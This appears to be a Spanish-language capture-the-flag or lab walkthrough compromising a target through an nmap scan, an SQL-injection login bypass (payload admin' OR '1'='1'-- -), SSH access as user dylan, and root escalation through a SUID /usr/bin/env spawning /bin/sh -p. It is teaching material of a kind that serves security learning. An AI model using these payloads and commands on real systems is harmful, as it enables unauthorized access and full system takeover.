## 1. Reconocimiento de Puertos con Nmap
Usamos `nmap` para detectar puertos abiertos y versiones de servicios:

```bash
nmap -sV -O <IP_DEL_OBJETIVO>
```

Servicios Identificados:

| PUERTO | SERVICIO | VERSIÓN             |
| ------ | -------- | ------------------- |
| 22/tcp | ssh      | OpenSSH 8.9p1       |
| 80/tcp | http     | Apache httpd 2.4.52 |

Detectamos un servidor web Apache en el puerto 80, el cual será nuestro principal vector de ataque

## 2. Explotación: Inyección SQL

Accedemos a la aplicación web en el puerto 80, que presenta un formulario de inicio de sesión.
### 2.1. Detección de Inyección SQL
Para verificar si la aplicación es vulnerable a inyección SQL, introducimos una comilla simple (`‘`) en el campo de contraseña:

*   **Usuario:** `user`
*   **Contraseña:** `‘`

Si la aplicación es vulnerable, un mensaje de error de sintaxis SQL confirmará la vulnerabilidad y el tipo de base de datos (ej. MariaDB):

```
SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1
```

### 2.2. Bypass de Autenticación

Aprovechamos la vulnerabilidad para manipular la lógica de la consulta SQL y acceder sin credenciales válidas. Nuestro objetivo es inyectar una condición que siempre se evalúe como verdadera (`OR 1=1`).

**Payload Exitoso:**

- **Usuario:** `admin' OR '1'='1'-- -`
- **Contraseña:** `(cualquier cosa)`

**Análisis Técnico:** La consulta en el backend probablemente se asemeja a:

```SQL
SELECT * FROM users WHERE username = '$user' AND password = '$pass';
```

Al inyectar nuestro payload, la consulta resultante se interpreta así:

```SQL
SELECT * FROM users WHERE username = 'admin' OR '1'='1'-- -' AND password = '...';
```

- `admin`: Seleccionamos al usuario administrador.
- `' OR '1'='1`: Condición tautológica (siempre verdadera).
- `-- -`: Comentario de SQL que anula el resto de la consulta (la verificación de contraseña original).

Esto nos permite acceder al panel de administración, donde identificamos las credenciales o claves de acceso para el usuario **dylan**.

## 3. Acceso Inicial vía SSH

Una vez obtenido un nombre de usuario (ej. "Dylan") a través del bypass de autenticación, accedemos al sistema vía SSH:

```bash
ssh dylan@< IP_DEL_OBJETIVO >
```

El comando `whoami` confirma el usuario `dylan`.

## 4. Escalada de Privilegios
El objetivo es obtener privilegios de `root` buscando configuraciones erróneas.
### 4.1. Búsqueda de Binarios SUID

Buscamos archivos con el bit SUID habilitado que pertenecen a `root`. Estos archivos se ejecutan con los permisos de su propietario, lo que puede ser explotado.

```bash
find / -perm -4000 -user root 2>/dev/null
```

**salida**
```bash
/usr/lib/openssh/ssh-keysign 
/usr/lib/dbus-1.0/dbus-daemon-launch-helper 
/usr/bin/mount 
/usr/bin/gpasswd 
/usr/bin/chfn 
/usr/bin/env   ← Vulnerable 
/usr/bin/su
/usr/bin/newgrp 
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
```
Un binario común para explotar es `/usr/bin/env`.

### 4.2. Explotación de `env` (GTFOBins)

Consultamos [GTFOBins](https://www.google.com/search?q=https://gtfobins.github.io/gtfobins/env/%23suid) y confirmamos que `env` permite romper el entorno restringido si tiene permisos SUID.

**Comando de Explotación:** Ejecutamos `env` invocando una shell de sistema (`/bin/sh`) con el flag `-p` para preservar los privilegios efectivos (EUID).

```Bash
/usr/bin/env /bin/sh -p
```

**Verificación:**

```Bash
whoami
# root
```
